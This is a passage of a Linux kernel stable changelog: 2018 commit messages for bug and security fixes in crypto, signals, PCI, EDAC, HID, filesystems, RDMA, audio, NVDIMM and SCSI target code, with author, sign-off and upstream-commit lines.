testing speed of async ghash-generic (ghash-generic)
tcrypt: test 0 ( 16 byte blocks, 16 bytes per update, 1 updates):
tcrypt: hashing failed ret=-126
Cc:  # 4.6+
Fixes: 0660511c0bee ("crypto: tcrypt - Use ahash")
Tested-by: Franck Lenormand
Signed-off-by: Horia Geantă
Acked-by: Ard Biesheuvel
Signed-off-by: Herbert Xu
Signed-off-by: Greg Kroah-Hartman
commit c2ff394968b000d2e5cf692cab2865f66606761c
Author: Ondrej Mosnacek
Date: Thu Sep 13 10:51:31 2018 +0200
crypto: lrw - Fix out-of bounds access on counter overflow
commit fbe1a850b3b1522e9fc22319ccbbcd2ab05328d2 upstream.
When the LRW block counter overflows, the current implementation returns
128 as the index to the precomputed multiplication table, which has 128
entries. This patch fixes it to return the correct value (127).
Fixes: 64470f1b8510 ("[CRYPTO] lrw: Liskov Rivest Wagner, a tweakable narrow block cipher mode")
Cc:  # 2.6.20+
Reported-by: Eric Biggers
Signed-off-by: Ondrej Mosnacek
Signed-off-by: Herbert Xu
Signed-off-by: Greg Kroah-Hartman
commit 04eb71942e858c840d1e3a63d81d9bec83b157c5
Author: Eric W. Biederman
Date: Wed Oct 10 20:29:44 2018 -0500
signal: Guard against negative signal numbers in copy\_siginfo\_from\_user32
commit a36700589b85443e28170be59fa11c8a104130a5 upstream.
While fixing an out of bounds array access in known\_siginfo\_layout
reported by the kernel test robot it became apparent that the same bug
exists in siginfo\_layout and affects copy\_siginfo\_from\_user32.
The straight forward fix that makes guards against making this mistake
in the future and should keep the code size small is to just take an
unsigned signal number instead of a signed signal number, as I did to
fix known\_siginfo\_layout.
Cc: stable@vger.kernel.org
Fixes: cc731525f26a ("signal: Remove kernel interal si\_code magic")
Signed-off-by: "Eric W. Biederman"
Signed-off-by: Greg Kroah-Hartman
commit 392d51e0b5b86280a6e95f2849c0caabe064e884
Author: Eric W. Biederman
Date: Thu Sep 13 11:28:01 2018 +0200
signal/GenWQE: Fix sending of SIGKILL
commit 0ab93e9c99f8208c0a1a7b7170c827936268c996 upstream.
The genweq\_add\_file and genwqe\_del\_file by caching current without
using reference counting embed the assumption that a file descriptor
will never be passed from one process to another. It even embeds the
assumption that the the thread that opened the file will be in
existence when the process terminates. Neither of which are
guaranteed to be true.
Therefore replace caching the task\_struct of the opener with
pid of the openers thread group id. All the knowledge of the
opener is used for is as the target of SIGKILL and a SIGKILL
will kill the entire process group.
Rename genwqe\_force\_sig to genwqe\_terminate, remove it's unncessary
signal argument, update it's ownly caller, and use kill\_pid
instead of force\_sig.
The work force\_sig does in changing signal handling state is not
relevant to SIGKILL sent as SEND\_SIG\_PRIV. The exact same processess
will be killed just with less work, and less confusion. The work done
by force\_sig is really only needed for handling syncrhonous
exceptions.
It will still be possible to cause genwqe\_device\_remove to wait
8 seconds by passing a file descriptor to another process but
the possible user after free is fixed.
Fixes: eaf4722d4645 ("GenWQE Character device and DDCB queue")
Cc: stable@vger.kernel.org
Cc: Greg Kroah-Hartman
Cc: Frank Haverkamp
Cc: Joerg-Stephan Vogt
Cc: Michael Jung
Cc: Michael Ruettger
Cc: Kleber Sacilotto de Souza
Cc: Sebastian Ott
Cc: Eberhard S. Amann
Cc: Gabriel Krisman Bertazi
Cc: Guilherme G. Piccoli
Signed-off-by: "Eric W. Biederman"
Signed-off-by: Greg Kroah-Hartman
commit 33d19d93cd128624b961f94eb3e1999c532c2432
Author: Bin Meng
Date: Wed Sep 26 08:14:01 2018 -0700
PCI: Add Device IDs for Intel GPU "spurious interrupt" quirk
commit d0c9606b31a21028fb5b753c8ad79626292accfd upstream.
Add Device IDs to the Intel GPU "spurious interrupt" quirk table.
For these devices, unplugging the VGA cable and plugging it in again causes
spurious interrupts from the IGD. Linux eventually disables the interrupt,
but of course that disables any other devices sharing the interrupt.
The theory is that this is a VGA BIOS defect: it should have disabled the
IGD interrupt but failed to do so.
See f67fd55fa96f ("PCI: Add quirk for still enabled interrupts on Intel
Sandy Bridge GPUs") and 7c82126a94e6 ("PCI: Add new ID for Intel GPU
"spurious interrupt" quirk") for some history.
[bhelgaas: See link below for discussion about how to fix this more
generically instead of adding device IDs for every new Intel GPU. I hope
this is the last patch to add device IDs.]
Link: https://lore.kernel.org/linux-pci/1537974841-29928-1-git-send-email-bmeng.cn@gmail.com
Signed-off-by: Bin Meng
[bhelgaas: changelog]
Signed-off-by: Bjorn Helgaas
Cc: stable@vger.kernel.org # v3.4+
Signed-off-by: Greg Kroah-Hartman
commit 1e37e70dfc0e0a80f12cd3c3bace256dbcf908af
Author: Lukas Wunner
Date: Tue Sep 4 12:34:18 2018 -0500
PCI/ASPM: Fix link\_state teardown on device removal
commit aeae4f3e5c38d47bdaef50446dc0ec857307df68 upstream.
Upon removal of the last device on a bus, the link\_state of the bridge
leading to that bus is sought to be torn down by having pci\_stop\_dev()
call pcie\_aspm\_exit\_link\_state().
When ASPM was originally introduced by commit 7d715a6c1ae5 ("PCI: add
PCI Express ASPM support"), it determined whether the device being
removed is the last one by calling list\_empty() on the bridge's
subordinate devices list. That didn't work because the device is only
removed from the list slightly later in pci\_destroy\_dev().
Commit 3419c75e15f8 ("PCI: properly clean up ASPM link state on device
remove") attempted to fix it by calling list\_is\_last(), but that's not
correct either because it checks whether the device is at the \*end\* of
the list, not whether it's the last one \*left\* in the list. If the user
removes the device which happens to be at the end of the list via sysfs
but other devices are preceding the device in the list, the link\_state
is torn down prematurely.
The real fix is to move the invocation of pcie\_aspm\_exit\_link\_state() to
pci\_destroy\_dev() and reinstate the call to list\_empty(). Remove a
duplicate check for dev->bus->self because pcie\_aspm\_exit\_link\_state()
already contains an identical check.
Fixes: 7d715a6c1ae5 ("PCI: add PCI Express ASPM support")
Signed-off-by: Lukas Wunner
Signed-off-by: Bjorn Helgaas
Cc: Shaohua Li
Cc: stable@vger.kernel.org # v2.6.26
Signed-off-by: Greg Kroah-Hartman
commit 6be746c4ef136e2afbfcb233f3fd9a50f98c58ec
Author: Vignesh R
Date: Tue Sep 25 10:51:51 2018 +0530
ARM: dts: dra7: Fix up unaligned access setting for PCIe EP
commit 6d0af44a82be87c13f2320821e9fbb8b8cf5a56f upstream.
Bit positions of PCIE\_SS1\_AXI2OCP\_LEGACY\_MODE\_ENABLE and
PCIE\_SS1\_AXI2OCP\_LEGACY\_MODE\_ENABLE in CTRL\_CORE\_SMA\_SW\_7 are
incorrectly documented in the TRM. In fact, the bit positions are
swapped. Update the DT bindings for PCIe EP to reflect the same.
Fixes: d23f3839fe97 ("ARM: dts: DRA7: Add pcie1 dt node for EP mode")
Cc: stable@vger.kernel.org
Signed-off-by: Vignesh R
Signed-off-by: Tony Lindgren
Signed-off-by: Greg Kroah-Hartman
commit 51819131edabfbb96b8495b875a73d58a10d53cf
Author: Qiuxu Zhuo
Date: Tue Oct 9 10:20:25 2018 -0700
EDAC, skx\_edac: Fix logical channel intermediate decoding
commit 8f18973877204dc8ca4ce1004a5d28683b9a7086 upstream.
The code "lchan = (lchan << 1) | ~lchan" for logical channel
intermediate decoding is wrong. The wrong intermediate decoding
result is {0xffffffff, 0xfffffffe}.
Fix it by replacing '~' with '!'. The correct intermediate
decoding result is {0x1, 0x2}.
Signed-off-by: Qiuxu Zhuo
Signed-off-by: Tony Luck
Signed-off-by: Borislav Petkov
CC: Aristeu Rozanski
CC: Mauro Carvalho Chehab
CC: linux-edac
Cc: stable@vger.kernel.org
Link: http://lkml.kernel.org/r/20181009172025.18594-1-tony.luck@intel.com
Signed-off-by: Greg Kroah-Hartman
commit 5d1267c68169de90ef1157751d37ac7d3ee3470f
Author: Tony Luck
Date: Fri Sep 28 14:39:34 2018 -0700
EDAC, {i7core,sb,skx}\_edac: Fix uncorrected error counting
commit 432de7fd7630c84ad24f1c2acd1e3bb4ce3741ca upstream.
The count of errors is picked up from bits 52:38 of the machine check
bank status register. But this is the count of \*corrected\* errors. If an
uncorrected error is being logged, the h/w sets this field to 0. Which
means that when edac\_mc\_handle\_error() is called, the EDAC core will
carefully add zero to the appropriate uncorrected error counts.
Signed-off-by: Tony Luck
[ Massage commit message. ]
Signed-off-by: Borislav Petkov
Cc: stable@vger.kernel.org
Cc: Aristeu Rozanski
Cc: Mauro Carvalho Chehab
Cc: Qiuxu Zhuo
Cc: linux-edac
Link: http://lkml.kernel.org/r/20180928213934.19890-1-tony.luck@intel.com
Signed-off-by: Greg Kroah-Hartman
commit 468d9f010f16a107db78e8ccf78f39049486a711
Author: Michael Jin
Date: Thu Aug 16 15:28:40 2018 -0400
EDAC, amd64: Add Family 17h, models 10h-2fh support
commit 8960de4a5ca7980ed1e19e7ca5a774d3b7a55c38 upstream.
Add new device IDs for family 17h, models 10h-2fh.
This is required by amd64\_edac\_mod in order to properly detect PCI
device functions 0 and 6.
Signed-off-by: Michael Jin
Reviewed-by: Yazen Ghannam
Cc:
Link: http://lkml.kernel.org/r/20180816192840.31166-1-mikhail.jin@gmail.com
Signed-off-by: Borislav Petkov
Signed-off-by: Greg Kroah-Hartman
commit b599ba1309c40fd186f829c2b71d0bcca45365e2
Author: Breno Leitao
Date: Fri Oct 19 17:01:33 2018 -0300
HID: hiddev: fix potential Spectre v1
commit f11274396a538b31bc010f782e05c2ce3f804c13 upstream.
uref->usage\_index can be indirectly controlled by userspace, hence leading
to a potential exploitation of the Spectre variant 1 vulnerability.
This field is used as an array index by the hiddev\_ioctl\_usage() function,
when 'cmd' is either HIDIOCGCOLLECTIONINDEX, HIDIOCGUSAGES or
HIDIOCSUSAGES.
For cmd == HIDIOCGCOLLECTIONINDEX case, uref->usage\_index is compared to
field->maxusage and then used as an index to dereference field->usage
array. The same thing happens to the cmd == HIDIOC{G,S}USAGES cases, where
uref->usage\_index is checked against an array maximum value and then it is
used as an index in an array.
This is a summary of the HIDIOCGCOLLECTIONINDEX case, which matches the
traditional Spectre V1 first load:
copy\_from\_user(uref, user\_arg, sizeof(\*uref))
if (uref->usage\_index >= field->maxusage)
goto inval;
i = field->usage[uref->usage\_index].collection\_index;
return i;
This patch fixes this by sanitizing field uref->usage\_index before using it
to index field->usage (HIDIOCGCOLLECTIONINDEX) or field->value in
HIDIOC{G,S}USAGES arrays, thus, avoiding speculation in the first load.
Cc:
Signed-off-by: Breno Leitao
v2: Contemplate cmd == HIDIOC{G,S}USAGES case
Signed-off-by: Jiri Kosina
Signed-off-by: Greg Kroah-Hartman
commit 19785f4c18b72c21f2f9d2539d4b59ef12d109de
Author: Jason Gerecke
Date: Wed Oct 10 13:40:26 2018 -0700
HID: wacom: Work around HID descriptor bug in DTK-2451 and DTH-2452
commit 11db8173dbab7a94cf5ba5225fcedbfc0f3b7e54 upstream.
The DTK-2451 and DTH-2452 have a buggy HID descriptor which incorrectly
contains a Cintiq-like report, complete with pen tilt, rotation, twist, serial
number, etc. The hardware doesn't actually support this data but our driver
duitifully sets up the device as though it does. To ensure userspace has a
correct view of devices without updated firmware, we clean up this incorrect
data in wacom\_setup\_device\_quirks.
We're also careful to clear the WACOM\_QUIRK\_TOOLSERIAL flag since its presence
causes the driver to wait for serial number information (via
wacom\_wac\_pen\_serial\_enforce) that never comes, resulting in
the pen being non-responsive.
Signed-off-by: Jason Gerecke
Fixes: 8341720642 ("HID: wacom: Queue events with missing type/serial data for later processing")
Cc: stable@vger.kernel.org # v4.16+
Signed-off-by: Jiri Kosina
Signed-off-by: Greg Kroah-Hartman
commit f77c84673d8a85d802c15c855fb5705a3640d5fc
Author: Stephen Smalley
Date: Tue Sep 4 16:51:36 2018 -0400
selinux: fix mounting of cgroup2 under older policies
commit 7bb185edb0306bb90029a5fa6b9cff900ffdbf4b upstream.
commit 901ef845fa2469c ("selinux: allow per-file labeling for cgroupfs")
broke mounting of cgroup2 under older SELinux policies which lacked
a genfscon rule for cgroup2. This prevents mounting of cgroup2 even
when SELinux is permissive.
Change the handling when there is no genfscon rule in policy to
just mark the inode unlabeled and not return an error to the caller.
This permits mounting and access if allowed by policy, e.g. to
unconfined domains.
I also considered changing the behavior of security\_genfs\_sid() to
never return -ENOENT, but the current behavior is relied upon by
other callers to perform caller-specific handling.
Fixes: 901ef845fa2469c ("selinux: allow per-file labeling for cgroupfs")
CC:
Reported-by: Dmitry Vyukov
Reported-by: Waiman Long
Signed-off-by: Stephen Smalley
Tested-by: Waiman Long
Signed-off-by: Paul Moore
Signed-off-by: Greg Kroah-Hartman
commit 15f255ec0f768bebebd8e3d9dfaad0afb9e78d4d
Author: Theodore Ts'o
Date: Fri Oct 12 09:28:09 2018 -0400
ext4: fix use-after-free race in ext4\_remount()'s error path
commit 33458eaba4dfe778a426df6a19b7aad2ff9f7eec upstream.
It's possible for ext4\_show\_quota\_options() to try reading
s\_qf\_names[i] while it is being modified by ext4\_remount() --- most
notably, in ext4\_remount's error path when the original values of the
quota file name gets restored.
Reported-by: syzbot+a2872d6feea6918008a9@syzkaller.appspotmail.com
Signed-off-by: Theodore Ts'o
Cc: stable@kernel.org # 3.2+
Signed-off-by: Greg Kroah-Hartman
commit ce1daaa84d87a633a0668307dfa279037d6e8fcd
Author: Wang Shilong
Date: Wed Oct 3 12:19:21 2018 -0400
ext4: propagate error from dquot\_initialize() in EXT4\_IOC\_FSSETXATTR
commit 182a79e0c17147d2c2d3990a9a7b6b58a1561c7a upstream.
We return most failure of dquota\_initialize() except
inode evict, this could make a bit sense, for example
we allow file removal even quota files are broken?
But it dosen't make sense to allow setting project
if quota files etc are broken.
Signed-off-by: Wang Shilong
Signed-off-by: Theodore Ts'o
Cc: stable@kernel.org
Signed-off-by: Greg Kroah-Hartman
commit 0d0413e92f4434b1e490f78aa8bf75f6a7122e52
Author: Wang Shilong
Date: Wed Oct 3 10:33:32 2018 -0400
ext4: fix setattr project check in fssetxattr ioctl
commit dc7ac6c4cae3b58724c2f1e21a7c05ce19ecd5a8 upstream.
Currently, project quota could be changed by fssetxattr
ioctl, and existed permission check inode\_owner\_or\_capable()
is obviously not enough, just think that common users could
change project id of file, that could make users to
break project quota easily.
This patch try to follow same regular of xfs project
quota:
"Project Quota ID state is only allowed to change from
within the init namespace. Enforce that restriction only
if we are trying to change the quota ID state.
Everything else is allowed in user namespaces."
Besides that, check and set project id'state should
be an atomic operation, protect whole operation with
inode lock, ext4\_ioctl\_setproject() is only used for
ioctl EXT4\_IOC\_FSSETXATTR, we have held mnt\_want\_write\_file()
before ext4\_ioctl\_setflags(), and ext4\_ioctl\_setproject()
is called after ext4\_ioctl\_setflags(), we could share
codes, so remove it inside ext4\_ioctl\_setproject().
Signed-off-by: Wang Shilong
Signed-off-by: Theodore Ts'o
Reviewed-by: Andreas Dilger
Cc: stable@kernel.org
Signed-off-by: Greg Kroah-Hartman
commit 99a3b22447272258a8ea114db493ea4dcd658c9c
Author: Lukas Czerner
Date: Tue Oct 2 21:18:45 2018 -0400
ext4: initialize retries variable in ext4\_da\_write\_inline\_data\_begin()
commit 625ef8a3acd111d5f496d190baf99d1a815bd03e upstream.
Variable retries is not initialized in ext4\_da\_write\_inline\_data\_begin()
which can lead to nondeterministic number of retries in case we hit
ENOSPC. Initialize retries to zero as we do everywhere else.
Signed-off-by: Lukas Czerner
Signed-off-by: Theodore Ts'o
Fixes: bc0ca9df3b2a ("ext4: retry allocation when inline->extent conversion failed")
Cc: stable@kernel.org
Signed-off-by: Greg Kroah-Hartman
commit b2af09dd37433a10c5f626339ae406f135f8bfb2
Author: Theodore Ts'o
Date: Tue Oct 2 18:21:19 2018 -0400
ext4: fix EXT4\_IOC\_SWAP\_BOOT
commit 18aded17492088962ef43f00825179598b3e8c58 upstream.
The code EXT4\_IOC\_SWAP\_BOOT ioctl hasn't been updated in a while, and
it's a bit broken with respect to more modern ext4 kernels, especially
metadata checksums.
Other problems fixed with this commit:
\* Don't allow installing a DAX, swap file, or an encrypted file as a
boot loader.
\* Respect the immutable and append-only flags.
\* Wait until any DIO operations are finished \*before\* calling
truncate\_inode\_pages().
\* Don't swap inode->i\_flags, since these flags have nothing to do with
the inode blocks --- and it will give the IMA/audit code heartburn
when the inode is evicted.
Signed-off-by: Theodore Ts'o
Cc: stable@kernel.org
Reported-by: syzbot+e81ccd4744c6c4f71354@syzkaller.appspotmail.com
Signed-off-by: Greg Kroah-Hartman
commit 8c448126af0e8fb16ef43303aa30890baa6f4e78
Author: Al Viro
Date: Sat Oct 13 00:19:13 2018 -0400
gfs2\_meta: ->mount() can get NULL dev\_name
commit 3df629d873f8683af6f0d34dfc743f637966d483 upstream.
get in sync with mount\_bdev() handling of the same
Reported-by: syzbot+c54f8e94e6bba03b04e9@syzkaller.appspotmail.com
Cc: stable@vger.kernel.org
Signed-off-by: Al Viro
Signed-off-by: Greg Kroah-Hartman
commit 25881163ae1f2d26458a6c57aabff41787ef8a69
Author: Jan Kara
Date: Fri Oct 5 18:44:40 2018 -0400
jbd2: fix use after free in jbd2\_log\_do\_checkpoint()
commit ccd3c4373eacb044eb3832966299d13d2631f66f upstream.
The code cleaning transaction's lists of checkpoint buffers has a bug
where it increases bh refcount only after releasing
journal->j\_list\_lock. Thus the following race is possible:
CPU0 CPU1
jbd2\_log\_do\_checkpoint()
jbd2\_journal\_try\_to\_free\_buffers()
\_\_journal\_try\_to\_free\_buffer(bh)
...
while (transaction->t\_checkpoint\_io\_list)
...
if (buffer\_locked(bh)) {
<-- IO completes now, buffer gets unlocked -->
spin\_unlock(&journal->j\_list\_lock);
spin\_lock(&journal->j\_list\_lock);
\_\_jbd2\_journal\_remove\_checkpoint(jh);
spin\_unlock(&journal->j\_list\_lock);
try\_to\_free\_buffers(page);
get\_bh(bh) <-- accesses freed bh
Fix the problem by grabbing bh reference before unlocking
journal->j\_list\_lock.
Fixes: dc6e8d669cf5 ("jbd2: don't call get\_bh() before calling \_\_jbd2\_journal\_remove\_checkpoint()")
Fixes: be1158cc615f ("jbd2: fold \_\_process\_buffer() into jbd2\_log\_do\_checkpoint()")
Reported-by: syzbot+7f4a27091759e2fe7453@syzkaller.appspotmail.com
CC: stable@vger.kernel.org
Reviewed-by: Lukas Czerner
Signed-off-by: Jan Kara
Signed-off-by: Theodore Ts'o
Signed-off-by: Greg Kroah-Hartman
commit 3b0b2820a64f2d0e9c47ef611ac3c5c44740fe21
Author: Jason Gunthorpe
Date: Tue Aug 14 15:33:02 2018 -0700
IB/rxe: Revise the ib\_wr\_opcode enum
commit 9a59739bd01f77db6fbe2955a4fce165f0f43568 upstream.
This enum has become part of the uABI, as both RXE and the
ib\_uverbs\_post\_send() command expect userspace to supply values from this
enum. So it should be properly placed in include/uapi/rdma.
In userspace this enum is called 'enum ibv\_wr\_opcode' as part of
libibverbs.h. That enum defines different values for IB\_WR\_LOCAL\_INV,
IB\_WR\_SEND\_WITH\_INV, and IB\_WR\_LSO. These were introduced (incorrectly, it
turns out) into libiberbs in 2015.
The kernel has changed its mind on the numbering for several of the IB\_WC
values over the years, but has remained stable on IB\_WR\_LOCAL\_INV and
below.
Based on this we can conclude that there is no real user space user of the
values beyond IB\_WR\_ATOMIC\_FETCH\_AND\_ADD, as they have never worked via
rdma-core. This is confirmed by inspection, only rxe uses the kernel enum
and implements the latter operations. rxe has clearly never worked with
these attributes from userspace. Other drivers that support these opcodes
implement the functionality without calling out to the kernel.
To make IB\_WR\_SEND\_WITH\_INV and related work for RXE in userspace we
choose to renumber the IB\_WR enum in the kernel to match the uABI that
userspace has bee using since before Soft RoCE was merged. This is an
overall simpler configuration for the whole software stack, and obviously
can't break anything existing.
Reported-by: Seth Howell
Tested-by: Seth Howell
Fixes: 8700e3e7c485 ("Soft RoCE driver")
Cc:
Signed-off-by: Jason Gunthorpe
Signed-off-by: Greg Kroah-Hartman
commit b8a7fdb121274fb5c69a56fcaf19e2be1a062f81
Author: Artemy Kovalyov
Date: Mon Oct 15 14:13:35 2018 +0300
IB/mlx5: Fix MR cache initialization
commit 013c2403bf32e48119aeb13126929f81352cc7ac upstream.
Schedule MR cache work only after bucket was initialized.
Cc:  # 4.10
Fixes: 49780d42dfc9 ("IB/mlx5: Expose MR cache for mlx5\_ib")
Signed-off-by: Artemy Kovalyov
Reviewed-by: Majd Dibbiny
Signed-off-by: Leon Romanovsky
Signed-off-by: Jason Gunthorpe
Signed-off-by: Greg Kroah-Hartman
commit 8d564c8c60c505fc0d484a14a2965a39d5dd721e
Author: Daniel Mack
Date: Thu Oct 11 20:32:05 2018 +0200
ASoC: sta32x: set ->component pointer in private struct
commit 747df19747bc9752cd40b9cce761e17a033aa5c2 upstream.
The ESD watchdog code in sta32x\_watchdog() dereferences the pointer
which is never assigned.
This is a regression from a1be4cead9b950 ("ASoC: sta32x: Convert to direct
regmap API usage.") which went unnoticed since nobody seems to use that ESD
workaround.
Fixes: a1be4cead9b950 ("ASoC: sta32x: Convert to direct regmap API usage.")
Signed-off-by: Daniel Mack
Signed-off-by: Mark Brown
Cc: stable@vger.kernel.org
Signed-off-by: Greg Kroah-Hartman
commit 77a651186ed5ee9aff6e3811b0b6e757a44d8eeb
Author: Takashi Iwai
Date: Wed Oct 3 19:31:44 2018 +0200
ASoC: intel: skylake: Add missing break in skl\_tplg\_get\_token()
commit 9c80c5a8831471e0a3e139aad1b0d4c0fdc50b2f upstream.
skl\_tplg\_get\_token() misses a break in the big switch() block for
SKL\_TKN\_U8\_CORE\_ID entry.
Spotted nicely by -Wimplicit-fallthrough compiler option.
Fixes: 6277e83292a2 ("ASoC: Intel: Skylake: Parse vendor tokens to build module data")
Cc:
Signed-off-by: Takashi Iwai
Signed-off-by: Mark Brown
Signed-off-by: Greg Kroah-Hartman
commit 6c1400b39151625c356e84d44c9e9bfb67109dbd
Author: Dan Williams
Date: Thu Oct 4 16:32:08 2018 -0700
libnvdimm, pmem: Fix badblocks population for 'raw' namespaces
commit 91ed7ac444ef749603a95629a5ec483988c4f14b upstream.
The driver is only initializing bb\_res in the devm\_memremap\_pages()
paths, but the raw namespace case is passing an uninitialized bb\_res to
nvdimm\_badblocks\_populate().
Fixes: e8d513483300 ("memremap: change devm\_memremap\_pages interface...")
Cc:
Cc: Christoph Hellwig
Reported-by: Jacek Zloch
Reported-by: Krzysztof Rusocki
Reviewed-by: Vishal Verma
Signed-off-by: Dan Williams
Signed-off-by: Greg Kroah-Hartman
commit 8f696986dbf2f9034d90eff19cb29996b65cbf50
Author: Dan Williams
Date: Thu Sep 27 15:01:55 2018 -0700
libnvdimm, region: Fail badblocks listing for inactive regions
commit 5d394eee2c102453278d81d9a7cf94c80253486a upstream.
While experimenting with region driver loading the following backtrace
was triggered:
INFO: trying to register non-static key.
the code is fine but needs lockdep annotation.
turning off the locking correctness validator.
[..]
Call Trace:
dump\_stack+0x85/0xcb
register\_lock\_class+0x571/0x580
? \_\_lock\_acquire+0x2ba/0x1310
? kernfs\_seq\_start+0x2a/0x80
\_\_lock\_acquire+0xd4/0x1310
? dev\_attr\_show+0x1c/0x50
? \_\_lock\_acquire+0x2ba/0x1310
? kernfs\_seq\_start+0x2a/0x80
? lock\_acquire+0x9e/0x1a0
lock\_acquire+0x9e/0x1a0
? dev\_attr\_show+0x1c/0x50
badblocks\_show+0x70/0x190
? dev\_attr\_show+0x1c/0x50
dev\_attr\_show+0x1c/0x50
This results from a missing successful call to devm\_init\_badblocks()
from nd\_region\_probe(). Block attempts to show badblocks while the
region is not enabled.
Fixes: 6a6bef90425e ("libnvdimm: add mechanism to publish badblocks...")
Cc:
Reviewed-by: Johannes Thumshirn
Reviewed-by: Dave Jiang
Signed-off-by: Dan Williams
Signed-off-by: Greg Kroah-Hartman
commit 4f1a55a4f990016406147cf3e0c9487bf83e50f0
Author: Alexander Duyck
Date: Tue Sep 25 13:53:02 2018 -0700
libnvdimm: Hold reference on parent while scheduling async init
commit b6eae0f61db27748606cc00dafcfd1e2c032f0a5 upstream.
Unlike asynchronous initialization in the core we have not yet associated
the device with the parent, and as such the device doesn't hold a reference
to the parent.
In order to resolve that we should be holding a reference on the parent
until the asynchronous initialization has completed.
Cc:
Fixes: 4d88a97aa9e8 ("libnvdimm: ...base ... infrastructure")
Signed-off-by: Alexander Duyck
Signed-off-by: Dan Williams
Signed-off-by: Greg Kroah-Hartman
commit 7a338b87b93128f6bf846c9aec27ffe0b93b0580
Author: Nicholas Bellinger
Date: Wed Oct 10 03:23:10 2018 +0000
scsi: target: Fix target\_wait\_for\_sess\_cmds breakage with active signals
commit 38fe73cc2c96fbc9942b07220f2a4f1bab37392d upstream.
With the addition of commit 00d909a10710 ("scsi: target: Make the session
shutdown code also wait for commands that are being aborted") in v4.19-rc, it
incorrectly assumes no signals will be pending for task\_struct executing the
normal session shutdown and I/O quiesce code-path.
For example, iscsi-target and iser-target issue SIGINT to all kthreads as part
of session shutdown. This has been the behaviour since day one.
As-is when signals are pending with se\_cmds active in se\_sess->sess\_cmd\_list,
wait\_event\_interruptible\_lock\_irq\_timeout() returns a negative number and
immediately kills the machine because of the do while (ret <= 0) loop that was
added in commit 00d909a107 to spin while backend I/O is taking any amount of
extended time (say 30 seconds) to complete.
Here's what it looks like in action with debug plus delayed backend I/O
completion:
[ 4951.909951] se\_sess: 000000003e7e08fa before target\_wait\_for\_sess\_cmds
[ 4951.914600] target\_wait\_for\_sess\_cmds: signal\_pending: 1
[ 4951.918015] wait\_event\_interruptible\_lock\_irq\_timeout ret: -512 signal\_pending: 1 loop count: 0
[ 4951.921639] wait\_event\_interruptible\_lock\_irq\_timeout ret: -512 signal\_pending: 1 loop count: 1
[ 4951.921944] wait\_event\_interruptible\_lock\_irq\_timeout ret: -512 signal\_pending: 1 loop count: 2
[ 4951.921944] wait\_event\_interruptible\_lock\_irq\_timeout ret: -512 signal\_pending: 1 loop count: 3
[ 4951.921944] wait\_event\_interruptible\_lock\_irq\_timeout ret: -512 signal\_pending: 1 loop count: 4
[ 4951.921944] wait\_event\_interruptible\_lock\_irq\_timeout ret: -512 signal\_pending: 1 loop count: 5
[ 4951.921944] wait\_event\_interruptible\_lock\_irq\_timeout ret: -512 signal\_pending: 1 loop count: 6
[ 4951.921944] wait\_event\_interruptible\_lock\_irq\_timeout ret: -512 signal\_pending: 1 loop count: 7
[ 4951.921944] wait\_event\_interruptible\_lock\_irq\_timeout ret: -512 signal\_pending: 1 loop count: 8
[ 4951.921944] wait\_event\_interruptible\_lock\_irq\_timeout ret: -512 signal\_pending: 1 loop count: 9
... followed by the usual RCU CPU stalls and deadlock.
There was never a case pre commit 00d909a107 where
wait\_for\_complete(&se\_cmd->cmd\_wait\_comp) was able to be interrupted, so to
address this for v4.19+ moving forward go ahead and use
wait\_event\_lock\_irq\_timeout() instead so new code works with all fabric
drivers.
Also for commit 00d909a107, fix a minor regression in
target\_release\_cmd\_kref() to only wake\_up the new se\_sess->cmd\_list\_wq only
when shutdown has actually been triggered via se\_sess->sess\_tearing\_down.
Fixes: 00d909a10710 ("scsi: target: Make the session shutdown code also wait for commands that are being aborted")
Cc:  # v4.19+
Cc: Bart Van Assche
Cc: Mike Christie
Cc: Hannes Reinecke
Cc: Christoph Hellwig
Cc: Sagi Grimberg
Cc: Bryant G. Ly
Tested-by: Nicholas Bellinger
Signed-off-by: Nicholas Bellinger
Reviewed-by: Bryant G. Ly
Signed-off-by: Martin K. Petersen
Signed-off-by: Greg Kroah-Hartman
commit fd594155e491a545255dc0d118cb80f8edfce126
Author: Nicholas Bellinger
Date: Wed Oct 10 03:23:09 2018 +0000
scsi: sched/wait: Add wait\_event\_lock\_irq\_timeout for TASK\_UNINTERRUPTIBLE usage
commit 25ab0bc334b43bbbe4eabc255006ce42a9424da2 upstream.
Short of reverting commit 00d909a10710 ("scsi: target: Make the session
shutdown code also wait for commands that are being aborted") for v4.19,
target-core needs a wait\_event\_t macro can be executed using
TASK\_UNINTERRUPTIBLE to function correctly with existing fabric drivers that
expect to run with signals pending during session shutdown and active se\_cmd
I/O quiesce.
The most notable is iscsi-target/iser-target, while ibmvscsi\_tgt invokes
session shutdown logic from userspace via configfs attribute that could also
potentially have signals pending.
So go ahead and introduce wait\_event\_lock\_irq\_timeout() to achieve this, and
update + rename \_\_wait\_event\_lock\_irq\_timeout() to make it accept 'state' as a
parameter.
Fixes: 00d909a10710 ("scsi: target: Make the session shutdown code also wait for commands that are being aborted")
Cc:  # v4.19+
Cc: Bart Van Assche
Cc: Mike Christie
Cc: Hannes Reinecke
Cc: Christoph Hellwig
Cc: Sagi Grimberg
Cc: Bryant G. Ly
Cc: Peter Zijlstra (Intel)
Tested-by: Nicholas Bellinger
Signed-off-by: Nicholas Bellinger
Reviewed-by: Bryant G. Ly
Acked-by: Peter Zijlstra (Intel)
Reviewed-by: Bart Van Assche
Signed-off-by: Martin K. Petersen
Signed-off-by: Greg Kroah-Hartman
commit 1ff435098faacd4f936a440d175bf8409352f884
Author: Christian Lamparter
Date: Sun Oct 14 23:28:50 2018 +0200
dmaengine: ppc4xx: fix off-by-one build failure
commit 27d8d2d7a9b7eb05c4484b74b749eaee7b50b845 upstream.
There are two poly\_store, but one should have been poly\_show.
|adma.c:4382:16: error: conflicting types for 'poly\_store'
| static ssize\_t poly\_store(struct device\_driver \*dev, const char \*buf,
| ^~~~~~~~~~
|adma.c:4363:16: note: previous definition of 'poly\_store' was here
| static ssize\_t poly\_store(struct device\_driver \*dev, char \*buf)
| ^~~~~~~~~~
CC: stable@vger.kernel.org
Fixes: 13efe1a05384 ("dmaengine: ppc4xx: remove DRIVER\_ATTR() usage")
Signed-off-by: Christian Lamparter
Signed-off-by: Vinod Koul
Signed-off-by: Greg Kroah-Hartman
commit 247a9fa4b41842bc2dc3495a7af14e49aad315f6
Author: Stefan Nuernberger
Date: Mon Sep 17 19:46:53 2018 +0200
net/ipv4: defensive cipso option parsing
commit 076ed3da0c9b2f88d9157dbe7044a45641ae369e upstream.
